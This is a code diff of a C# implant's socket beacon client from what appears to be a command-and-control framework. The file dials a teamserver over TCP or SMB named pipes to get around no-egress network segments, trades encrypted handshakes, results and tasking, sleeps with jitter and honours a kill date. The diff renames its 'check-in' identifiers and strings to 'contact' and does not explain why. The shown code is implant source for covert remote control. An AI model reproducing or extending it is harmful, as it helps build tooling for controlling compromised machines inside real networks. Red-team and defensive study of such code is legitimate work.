@@ -7,10 +7,10 @@ using Rod.V1;
 namespace Rod.Implant.Internal;
 
 // The reference implant's socket poll client (architecture.md Sec 8): the
-// stream check-in contract over the transports a no-egress segment still
+// stream contact contract over the transports a no-egress segment still
 // allows -- a raw TCP socket (tcp://host:port) or a named pipe
 // (smb://host/pipe/name; a dot host is the local machine). One connection is
-// one poll check-in: dial, handshake, exchange one framed message each way,
+// one poll contact: dial, handshake, exchange one framed message each way,
 // close, sleep the cadence, reconnect. The interactive verbs ride the shared
 // store-and-forward carriage (PollChannels) every poll client runs. A whole
 // source-file module like its siblings: the build unit drops this file from
@@ -18,12 +18,12 @@ namespace Rod.Implant.Internal;
 // whose walk holds no socket-schemed entry to dial.
 
 /// <summary>
-/// Builds the socket check-in client off the shared setup; the factory the
+/// Builds the socket contact client off the shared setup; the factory the
 /// generated transport selection names for tcp:// and smb:// beacon entries.
 /// </summary>
-internal static class SocketCheckIn
+internal static class SocketContact
 {
-    public static ICheckInClient Create(CheckInSetup setup) => new SocketBeacon(
+    public static IContactClient Create(ContactSetup setup) => new SocketBeacon(
         setup.Egress,
         setup.Enrollment.ImplantId,
         setup.Enrollment.CAs,
@@ -40,14 +40,14 @@ internal static class SocketCheckIn
 }
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over the socket wire: dial the
+/// Runs the implant's contact lifecycle over the socket wire: dial the
 /// connection, run the envelope's own request/response cycle -- the request
 /// message carrying the handshake and every accumulated upstream frame, the
 /// response carrying the handshake response, staged answers, and queued
 /// tasking -- then close, sleep the baked cadence, and reconnect. A dropped
 /// connection is a reconnect, not a termination.
 /// </summary>
-internal sealed class SocketBeacon : ICheckInClient
+internal sealed class SocketBeacon : IContactClient
 {
     private readonly EgressEndpoints _egress;
     private readonly string _implantId;
@@ -68,28 +68,28 @@ internal sealed class SocketBeacon : ICheckInClient
     // carrier is poll-only, so every channel batches through it.
     private readonly PollChannels _poll;
 
-    // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
+    // The per-artifact contact seal (architecture.md Sec 8/9): the baked key
     // split into its id and key halves, present only when the bake asked for
-    // sealed check-ins -- the same application-layer confidentiality the
+    // sealed contacts -- the same application-layer confidentiality the
     // cleartext http posture carries, wrapping every message this wire
     // exchanges.
     private readonly (byte[] KeyId, byte[] Key)? _seal;
 
-    // The check-in counter: incremented before every cycle attempt, so a
+    // The contact counter: incremented before every cycle attempt, so a
     // retransmitted batch after a lost response still carries a fresh value
     // (the server refuses a counter at or below its floor) while the batch
     // semantics make the retransmission itself idempotent.
-    private long _checkInCounter;
+    private long _contactCounter;
 
-    // The sealed check-in counter's size in bytes: an 8-byte big-endian
+    // The sealed contact counter's size in bytes: an 8-byte big-endian
     // integer, the same width the teamserver's floor reads.
     private const int CounterBytes = 8;
 
     // The purpose tags binding each sealed body to its direction, the exact
     // strings the teamserver's AesGcmEnvelope carries: a sealed request can
     // never be reflected as a response and vice versa.
-    private const string CheckInRequestAad = "rod-checkin-v1";
-    private const string CheckInResponseAad = "rod-checkin-response-v1";
+    private const string ContactRequestAad = "rod-contact-v1";
+    private const string ContactResponseAad = "rod-contact-response-v1";
 
     // The staged tasks whose StagedPull frames ride the batch, in demand
     // order: the response answers each demand with its chunk run before any
@@ -130,7 +130,7 @@ internal sealed class SocketBeacon : ICheckInClient
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
         _poll = new PollChannels(_held, log);
-        _seal = transport is { SealsCheckIns: true }
+        _seal = transport is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
         // Batch discipline: results queue for the next cycle, so the
@@ -147,7 +147,7 @@ internal sealed class SocketBeacon : ICheckInClient
     /// </summary>
     public bool Serves(string beaconUrl) => BeaconUrl.IsSocket(beaconUrl);
 
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         try
         {
@@ -160,7 +160,7 @@ internal sealed class SocketBeacon : ICheckInClient
         }
     }
 
-    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
+    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -168,10 +168,10 @@ internal sealed class SocketBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!BeaconUrl.IsSocket(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -184,7 +184,7 @@ internal sealed class SocketBeacon : ICheckInClient
             }
             catch (Exception ex)
             {
-                _log.WriteLine($"socket check-in failed: {ex.Message}");
+                _log.WriteLine($"socket contact failed: {ex.Message}");
                 // The cycle died before its response: the batch's frames
                 // stay queued (delivered clears only on a crossed response),
                 // so the next cycle re-sends them whole -- first-wins
@@ -192,7 +192,7 @@ internal sealed class SocketBeacon : ICheckInClient
             }
 
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -209,17 +209,17 @@ internal sealed class SocketBeacon : ICheckInClient
             try
             {
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
-    // One connection, one check-in -- the envelope's own cycle shape over
+    // One connection, one contact -- the envelope's own cycle shape over
     // the socket wire: one request message (the handshake first, then every
     // upstream frame the run accumulated), one response message (the
     // handshake response, staged chunk runs answering the request's
@@ -261,9 +261,9 @@ internal sealed class SocketBeacon : ICheckInClient
         if (_seal is { } seal)
         {
             var plaintext = new byte[CounterBytes + encoded.Length];
-            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
+            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_contactCounter);
             encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
-            requestBody = EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad);
+            requestBody = EnvelopeWire.SealContactBody(plaintext, seal.KeyId, seal.Key, ContactRequestAad);
         }
         else
         {
@@ -279,12 +279,12 @@ internal sealed class SocketBeacon : ICheckInClient
             // A sealed cycle answers sealed: a body that does not verify
             // under the key this artifact carries is a dropped cycle, not a
             // parse -- nothing inside it is acted on.
-            responseBody = EnvelopeWire.TryOpenCheckInBody(responseBody, open.KeyId, open.Key, CheckInResponseAad)
-                ?? throw new InvalidOperationException("check-in response did not verify under the baked key");
+            responseBody = EnvelopeWire.TryOpenContactBody(responseBody, open.KeyId, open.Key, ContactResponseAad)
+                ?? throw new InvalidOperationException("contact response did not verify under the baked key");
         }
         var inbound = EnvelopeCodec.Parse(responseBody);
         if (inbound.Count == 0)
-            throw new InvalidOperationException("the check-in response carried no frames");
+            throw new InvalidOperationException("the contact response carried no frames");
         var response = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
         if (response.Status != HandshakeStatus.Ok)
         {
@@ -385,7 +385,7 @@ internal sealed class SocketBeacon : ICheckInClient
                 continue;
             }
 
-            // The receive-ack arm is per check-in: delivery evidence for the
+            // The receive-ack arm is per contact: delivery evidence for the
             // parsed frame, queued into the next request before anything
             // runs.
             if (acks)
